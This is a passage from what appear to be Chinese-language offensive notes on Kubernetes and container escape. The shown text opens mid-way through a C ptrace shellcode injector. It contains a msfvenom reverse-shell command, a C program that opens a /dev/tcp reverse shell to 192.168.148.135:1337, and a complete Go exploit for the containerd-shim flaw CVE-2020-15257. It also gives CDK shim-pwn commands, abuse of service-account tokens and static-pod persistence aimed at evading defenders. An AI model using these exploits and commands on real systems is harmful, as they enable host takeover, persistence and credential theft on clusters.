  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}
```

生成反弹shell的shellcode：

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.42.100 LPORT=4444 -f c
```

将c代码中的shellcode替换掉，同时记得修改SHELLCODE_SIZE。

编译出来后，用PID注入：

```shell
gcc -o injectc_c inject.c
./injectc_c 20017

nc -lvvp 39876
```

即可反弹到shell。

（本地没有复现）

## 6.利用高权限Service Account

使用 Kubernetes 做容器编排的话，在 POD 启动时，Kubernetes 会默认为容器挂载一个 Service Account 证书。同时，默认情况下 Kubernetes 会创建一个特有的 Service 用来指向 ApiServer。有了这两个条件，我们就拥有了在容器内直接和 APIServer 通信和交互的方式。



```shell
kubectl get svc
NAME            TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
kubernetes      ClusterIP   10.96.0.1       <none>        443/TCP        12d
nginx-service   NodePort    10.96.230.154   <none>        80:32600/TCP   12d



#-k:设置此选项将允许使用无证书的不安全SSL进行连接和传输。
curl -ik https://kubernetes
HTTP/2 403
audit-id: 73bface1-eedd-4dbf-acc6-c276142d30b5
cache-control: no-cache, private
content-type: application/json
x-content-type-options: nosniff
x-kubernetes-pf-flowschema-uid: 52ec31bb-26d3-436d-b651-39f2f6797fea
x-kubernetes-pf-prioritylevel-uid: b5914104-c193-4fd7-9ade-425d93bb160d
content-length: 217
date: Tue, 10 Oct 2023 11:48:37 GMT

{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
```





在POD的`/var/run/secrets/kubernetes.io/serviceaccount`下面即是service account的证书和token。

默认情况下，这个 Service Account 的证书和 token 虽然可以用于和 Kubernetes Default Service 的 APIServer 通信，但是是没有权限进行利用的。

当这个service account权限是cluster-admin的时候，就可以随意操控ApiServer。因此获取一个拥有绑定了 ClusterRole/cluster-admin Service Account 的 POD，其实就等于拥有了集群管理员的权限。



**坑点：**

1. 老版本的 kubectl 不会自动寻找和使用 Service Account 需要用 kubectl config set-cluster cfc 进行绑定或下载一个新版本的 kubectl 二进制程序；
2. 如果当前用户的目录下配置了 kubeconfig 即使是错误的，也会使用 kubeconfig 的配置去访问不会默认使用 Service Account ；
3. 历史上我们遇到很多集群会删除 Kubernetes Default Service，所以需要使用容器内的资产探测手法进行信息收集获取 apiserver 的地址。

## 7.CVE-2020-15257利用

当容器和宿主机共享一个 net namespace 时（如使用 --net=host 或者 Kubernetes 设置 pod container 的 .spec.hostNetwork 为 true）攻击者可对拥有特权的 containerd shim API 进行操作，可能导致容器逃逸获取主机权限、修改主机文件等危害。

（受影响的是containerd组件，containerd:containerd : <=1.3.7/<=1.4.0/<=1.4.1，因此需要安装特定版本的Docker才能复现，懒得装了）



当docker容器以`--net=host` 启动**会暴露containerd-shim 监听的 Unix 域套接字**：

```bash
cat /proc/net/unix | grep 'containerd-shim' | grep '@'
​
0000000000000000: 00000002 00000000 00010000 0001 01 65874 @/containerd-shim/067284ce2b310632459fd11fd3bfa296670c2eacd7abfbadf07ddd6ea580f7d9.sock@
```





利用containerd-shim Create API， 相当于执行runc create , 读取config.json 的配置，创建一个新容器。

```go
rpc Create(CreateTaskRequest) returns (CreateTaskResponse);
```

其中**CreateTaskRequest** 的 **stdout参数**，支持各种协议，可进行如下构造：

```go
r, err := shimClient.Create(ctx, &shimapi.CreateTaskRequest{
        ID: docker_id,
        Bundle: "/run/containerd/io.containerd.runtime.v1.linux/moby/"+docker_id+"/config.json",
        Runtime : "io.containerd.runtime.v1.linux",
        Stdin:  "anything",
        Stdout: "binary:///bin/sh?-c="+payload_path+"nc",
        Stderr: "anything",
        Terminal : false,
        Checkpoint : "anything",
    })
```

实现执行命令。需要知道docker_id和path，用前面讲到的方法即可。

写代码并编译成可执行程序：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
        system("/bin/sh -i >& /dev/tcp/192.168.148.135/1337 0>&1");
        return 0;
}
```



利用shim的Create api 来调用路径中存放的可执行程序，就会执行连接到另一台机器192.168.148.135，反弹shell，得到host的root权限，完成虚拟机逃逸。

exp：

```go
package main
​
import (
    "context"
    "errors"
    "io/ioutil"
    "log"
    "net"
    "regexp"
    "strings"
​
    "github.com/containerd/ttrpc"
    shimapi "github.com/containerd/containerd/runtime/v1/shim/v1"
)
​
func getDockerID() (string,  error) {
    re, err := regexp.Compile("pids:/docker/.*")
    if err != nil {
        return "", err
    }
    data, err := ioutil.ReadFile("/proc/self/cgroup")
    matches := re.FindAll(data, -1)
    if matches == nil {
        return "", errors.New("Cannot find docker id")
    }
​
    tmp_docker_id := matches[0]
    docker_id := string(tmp_docker_id[13 : len(tmp_docker_id)])
    return docker_id, nil
​
}
​
func getMergedPath() (string,  error) {
    re, err := regexp.Compile("workdir=.*")
    if err != nil {
        return "", err
    }
    data, err := ioutil.ReadFile("/etc/mtab")
    matches := re.FindAll(data, -1)
    if matches == nil {
        return "", errors.New("Cannot find merged path")
    }
​
    tmp_path := matches[0]
    path := string(tmp_path[8 : len(tmp_path)-8])
    merged := path + "merged/"
    return merged, nil
​
}
​
func getShimSockets() ([][]byte, error) {
    re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
    if err != nil {
        return nil, err
    }
    data, err := ioutil.ReadFile("/proc/net/unix")
    matches := re.FindAll(data, -1)
    if matches == nil {
        return nil, errors.New("Cannot find vulnerable socket")
    }
​
    return matches, nil
}
​
​
func exp(sock string, docker_id string, payload_path string) bool {
    sock = strings.Replace(sock, "@", "", -1)
    conn, err := net.Dial("unix", "\x00"+sock)
    if err != nil {
        log.Println(err)
        return false
    }
​
    client := ttrpc.NewClient(conn)
    shimClient := shimapi.NewShimClient(client)
​
    ctx := context.Background()
    md := ttrpc.MD{} 
    md.Set("containerd-namespace-ttrpc", "notmoby")
    ctx = ttrpc.WithMetadata(ctx, md)
​
    /* // poc get shim pid
    info, err := shimClient.ShimInfo(ctx, &types.Empty{})
    if err != nil {
        log.Println("rpc error:", err)
        return false
    }
​
    log.Println("shim pid:", info.ShimPid)
    */
​
    r, err := shimClient.Create(ctx, &shimapi.CreateTaskRequest{
        ID: docker_id,
        Bundle: "/run/containerd/io.containerd.runtime.v1.linux/moby/"+docker_id+"/config.json",
        Runtime : "io.containerd.runtime.v1.linux",
        Stdin:  "anything",
        //Stdout: "binary:///bin/sh?-c=cat%20/proc/self/status%20>/tmp/foobar",
        Stdout: "binary:///bin/sh?-c="+payload_path+"nc",
        Stderr: "anything",
        Terminal : false,
        Checkpoint : "anything",
    })
​
    if err != nil {
            log.Println(err)
            return false
    }
​
    log.Println(r)
    return true
}
​
func main() {
    matchset := make(map[string]bool)
    socks, err := getShimSockets()
​
    docker_id, err := getDockerID()
    log.Println("find docker id:", docker_id)
​
    merged_path, err := getMergedPath()
    log.Println("find path:", merged_path)
​
    if err != nil {
        log.Fatalln(err)
    }
​
    for _, b := range socks {
        sockname := string(b)
        if _, ok := matchset[sockname]; ok {
            continue
        }
        log.Println("try socket:", sockname)
        matchset[sockname] = true
        if exp(sockname, docker_id, merged_path) {
            break
        }
    }
​
    return
}
```

编译出可执行文件放在存在漏洞的容器中执行即可。



以及CDK：

```shell
reverse shell
./cdk run shim-pwn reverse <RHOST> <RPORT>

execute command
./cdk run shim-pwn "<shell_cmd>"
```





## 8.runc CVE-2019-5736 和容器组件历史逃逸漏洞综述

这里公开的 POC 很多，不同的环境和操作系统发行版本利用起来有一定的差异，可以参考进行利用：

1. github.com/feexd/pocs
2. github.com/twistlock/RunC-CVE-2019-5736
3. github.com/AbsoZed/DockerPwn.py
4. github.com/q3k/cve-2019-5736-poc



参考文章：https://web.archive.org/web/20190213095645/https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html（还没看）

## 9.内核漏洞提权

容器共享宿主机内核，因此我们可以使用宿主机的内核漏洞进行容器逃逸。

- 脏牛漏洞（CVE-2016-5195）
- CVE-2020-14386



## 10.写staticpod逃逸或权限维持

静态 Pod 直接由特定节点上的`kubelet`进程来管理，不通过 master 节点上的`apiserver`。无法与我们常用的控制器`Deployment`或者`DaemonSet`进行关联，它由`kubelet`进程自己来监控，当`pod`崩溃时重启该`pod`，`kubelet`也无法对他们进行健康检查。静态 pod 始终绑定在某一个`kubelet`，并且始终运行在同一个节点上。 `kubelet`会自动为每一个静态 pod 在 Kubernetes 的 apiserver 上创建一个镜像 Pod（Mirror Pod），因此我们可以在 apiserver 中查询到该 pod，但是不能通过 apiserver 进行控制（例如不能删除）。





在漏洞利用上有以下几点明显的优势：

1、 仅依赖于 kubelet

Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用。在 Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器母机节点之上。

2、 配置目录固定

Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为 /etc/kubernetes/manifests 或 /etc/kubelet.d/，一般情况不做更改。

3、 执行间隔比 Cron 更短

通过查看 Kubernetes 的源码，我们可以发现 kubelet 会每 20 秒监控新的 POD 配置文件并运行或更新对应的 POD；由 `c.FileCheckFrequency.Duration = 20 * time.Second` 控制，虽然 Cron 的每分钟执行已经算是非常及时，但 Static Pod 显然可以让等待 shell 的时间更短暂，对比 /etc/cron.daily/* ， /etc/cron.hourly/* ， /etc/cron.monthly/* ， /etc/cron.weekly/* 等目录就更不用说了。

另外，Cron 的分钟级任务也会遇到重复多次执行的问题，增加多余的动作更容易触发 IDS 和 IPS，而 Static Pod 若执行成功就不再调用，保持执行状态，仅在程序奔溃或关闭时可自动重启

4、 进程配置更灵活

Static Pod 支持 Kubernetes POD 的所有配置，等于可以运行任意配置的容器。不仅可以配置特权容器和 HostPID 使用 nscenter 直接获取容器母机权限；更可以配置不同 namespace、capabilities、cgroup、apparmor、seccomp 用于特殊的需求。

灵活的进程参数和 POD 配置使得 Static Pod 有更多方法对抗 IDS 和 IPS，因此也延生了很多新的对抗手法，这里就不再做过多介绍。

5、 检测新文件或文件变化的逻辑更通用

最重要的是，Static Pod 不依赖于 st_mtime 逻辑，也无需设置可执行权限，新文件检测逻辑更加通用。

而文件更新检测是基于 kubelet 维护的 POD Hash 表进行的，配置的更新可以很及时和确切的对 POD 容器进行重建。Static Pod 甚至包含稳定完善的奔溃重启机制，由 kubelet 维护，属于 kubelet 的默认行为无需新加配置。操作系统层的痕迹清理只需删除 Static Pod YAML 文件即可，kubelet 会自动移除关闭运行的恶意容器。同时，对于不了解 Static Pod 的蓝队选手来说，我们需要注意的是，使用 `kubectl delete` 删除恶意容器或使用 `docker stop` 关闭容器都无法完全清除 Static Pod 的恶意进程，kubelet 会守护并重启该 Pod。



创建静态pod只需要将pod的yaml文件放在节点的`/etc/kubernetes/manifests`（默认是这个路径，找不到需要读配置）路径下即可。

删除静态pod也是将这个yaml删掉即可。



# 容器相关组件的历史漏洞

![image-20231011133043976](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20231011133043976.png)



# 容器、容器编排组件 API 配置不当或未鉴权

涉及到前面提到的各种未授权利用。

```
kube-apiserver: 6443, 8080
kubectl proxy: 8080, 8081
kubelet: 10250, 10255, 4149
dashboard: 30000
docker api: 2375
etcd: 2379, 2380
kube-controller-manager: 10252
kube-proxy: 10256, 31442
kube-scheduler: 10251
weave: 6781, 6782, 6783
kubeflow-dashboard: 8080
```



## 1.组件分工

![image-20231011142050446](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20231011142050446.png)

假如用户想在集群里面新建一个容器集合单元，那各个组件以此会相继做什么事情呢？

1. 用户与 kubectl 或者 Kubernetes Dashboard 进行交互，提交需求。（例: kubectl create -f pod.yaml）;
2. kubectl 会读取 ~/.kube/config 配置，并与 apiserver 进行交互，协议：http/https;
3. apiserver 会协同 ETCD 等组件准备下发新建容器的配置给到节点，协议：http/https（除 ETCD 外还有例如 kube-controller-manager, scheduler 等组件用于规划容器资源和容器编排方向，此处简化省略）;
4. apiserver 与 kubelet 进行交互，告知其容器创建的需求，协议：http/https；
5. kubelet 与 Docker 等容器引擎进行交互，创建容器，协议：http/unix socket.



## 2.apiserver

![image-20231011143633391](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20231011143633391.png)



对于针对 Kubernetes 集群的攻击来说，获取 admin kubeconfig 和 apiserver 所在的 master node 权限基本上就是获取主机权限路程的终点。



## 3.kubelet

由于这里 10250 鉴权当前的 Kubernetes 设计是默认安全的，所以 10255 的开放就可能更加容易在红蓝对抗中起到至关重要的作用。10255 本身为只读端口，虽然开放之后默认不存在鉴权能力，无法直接利用在容器中执行命令，但是可以获取环境变量 ENV、主进程 CMDLINE 等信息，里面包含密码和秘钥等敏感信息的概率是很高的，可以快速帮我们在对抗中打开局面。



## 4.dashboard

在 dashboard 中默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录进入 dashboard。

然而通过点击 Skip 进入 dashboard 默认是没有操作集群的权限的，因为 Kubernetes 使用 RBAC(Role-based access control) 机制进行身份认证和权限管理，不同的 serviceaccount 拥有不同的集群权限。

我们点击 Skip 进入 dashboard 实际上使用的是 Kubernetes-dashboard 这个 ServiceAccount，如果此时该 ServiceAccount 没有配置特殊的权限，是默认没有办法达到控制集群任意功能的程度的。

但有些开发者为了方便或者在测试环境中会为 Kubernetes-dashboard 绑定 cluster-admin 这个 ClusterRole（cluster-admin 拥有管理集群的最高权限）。

之后创建恶意Pod控制node节点即可。

## 5.etcd

在 Kubernetes 中用户可以通过配置 /etc/kubernetes/manifests/etcd.yaml 更改 etcd pod 相关的配置，倘若管理员通过修改配置将 etcd 监听的 host 修改为 0.0.0.0，则通过 ectd 获取 Kubernetes 的认证鉴权 token 用于控制集群就是自然而然的思路了。

利用参考上面。



## 6.docker remote api

即https://blog.csdn.net/rfrder/article/details/122401691





## 7.kubectl proxy

如果你在集群的 POD 上开放一个端口并用 ClusterIP Service 绑定创建一个内部服务，如果没有开放 NodePort 或 LoadBalancer 等 Service 的话，你是无法在集群外网访问这个服务的（除非修改了 CNI 插件等）。

如果想临时在本地和外网调试的话，kubectl proxy 似乎是个不错的选择：

```bash
#使API server监听在本地的8009端口
kubectl proxy --port=8009

#设置API server接收所有主机的请求
kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009
```

这时候即可访问apiserver，但其实 kubectl proxy 转发的是 apiserver 所有的能力，而且是默认不鉴权的，所以 --address=0.0.0.0 就是极其危险的了。

利用方式同apiserver未授权的利用。



# 容器镜像安全

当获取到节点权限或管理员 PC 权限时，~/.docker/config.json 文件内就可能存有镜像仓库账号和密码信息：

![image-20231011150309650](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20231011150309650.png)

很多 POD 和线上容器在使用镜像时，可能用 latest 或默认没有指定版本，所以劫持镜像源之后只要在原本的 latest 之上植入恶意代码并 push 新的版本镜像，就可以在获取镜像权限之后进而获取线上的容器权限。



**不建议用 latest 镜像标签作为线上环境的长期方案；从研发运维角度的最佳实践来看，使用特定版本的 TAG 且可以和代码版本控制相对应是比较推荐的方案，应该保障每个镜像都是可追踪溯源的。**





# 二次开发所产生的安全问题

比如对Kubernetes api的请求转发或拼接。

如果需求需要在 Kubernetes 原本的能力上做开发的话，很有可能产品后端就是请求了 APIServer 的 Rest API 实现的。

攻击者破坏程序原本想对 APIServer 所表达的语义，注入或修改 Rest API 请求里所要表达的信息，就可以达到意想不到的效果。

![image-20231011185511535](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20231011185511535.png)



这类型的需求在多租户的集群设计里比较常见。渗透测试选手看到这样的代码或 API，首先想到的就是越权，把 namespace、pod 和容器名修改为他人的，就可以让二次开发的代码去删除其他用户的 POD、进入其他用户的容器里执行命令、获取其它 POD 的日志等。

除了上述的功能点，这里比较容易出问题且影响较大的功能和业务逻辑是多租户集群平台的自研 Web Console 功能，Web Console 的越权问题可以直接导致任意容器登录和远程控制，也是非常值得关注的一个点。

其实我们甚至可以修改获取日志、删除 POD、执行命令的 Rest API 语义，比如在namespace处插入`default/configmaps/istio-ca-root-cert?ingore=`



















# ==



# metadata

`169.254.169.254`是动态配置的 IPv4 链路本地地址。它只在单个网段有效，并且不被路由。大多数云提供商使用此地址来为实例提供计算元数据，包括 AWS、GCP Azure、Digital Ocean 等主要提供商。

我们可以继续使用 访问默认实例元数据服务`169.254.169.254`。我们还需要确定该服务使用哪个云提供商来运行此计算，以便我们可以使用特定的标头和查询。如果这不是托管在云提供商中，那么我们可以跳过此步骤并转向内部服务查询，就像 Kubernetes 集群中的其他微服务和内部服务一样。

`http://169.254.169.254/latest/meta-data/`





















# 探测

判断是否在docker容器或者pod里面

1. 根目录下面有`/.dockerenv`。

2. /proc/1/cgroup 内若包含docker或kube字符串则是在docker环境或k8s pod 之中

3. 没有常见命令`ifconfig`、`wget`、`ps`。

4. 查看环境变量中是否有k8s或者docker字符串。

5. 查看端口开放情况（netstat -anp），如果开放了一些特殊端口如6443、8080（api server）,2379（etcd）,10250、10255（kubelet），10256（kube-proxy） 那么可以初步判定为是在k8s环境中的一台Node或者master，这个方法亦可用于端口扫描探测目标主机是否为k8s集群中的机器。

6. 查看当前网段，k8s中 Flannel网络插件默认使用10.244.0.0/16网络，Calico默认使用192.168.0.0/16网络，如果出现在这些网段中（特别是10.244网段）那么可以初步判断为集群中的一个pod。pod里面没有命令很少，可以通过hostname -I(大写i)来查看ip地址

   ```shell
   root@nginx-deployment-5d65459b7c-4mfnl:/# hostname -I
   10.244.1.10
   ```

   

![图片](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/1640850509000-9ulxoy.png)

```shell
kube-apiserver: 6443, 8080
kubectl proxy: 8080, 8081
kubelet: 10250, 10255, 4149
dashboard: 30000
docker api: 2375
etcd: 2379, 2380
kube-controller-manager: 10252
kube-proxy: 10256, 31442
kube-scheduler: 10251
weave: 6781, 6782, 6783
kubeflow-dashboard: 8080
```



# CDK工具

https://github.com/cdk-team/CDK/wiki/CDK-Home-CN

1. 将CDK下载到你的公网服务器，监听端口：

```shell
nc -lvp 999 < cdk
```

1. 在已攻入的目标容器中执行：

```shell
cat < /dev/tcp/(你的IP)/(端口) > cdk
chmod a+x cdk
```

可是实际利用的时候没成功过几次。。。



具体参考`/Users/feng/ctftools/CDK/CDK.wiki`文档使用即可。

CDK工具也在`/Users/feng/ctftools/CDK/buildExec`



# 参考文章

https://tttang.com/archive/1465/

https://tttang.com/archive/1389

https://paper.seebug.org/1803/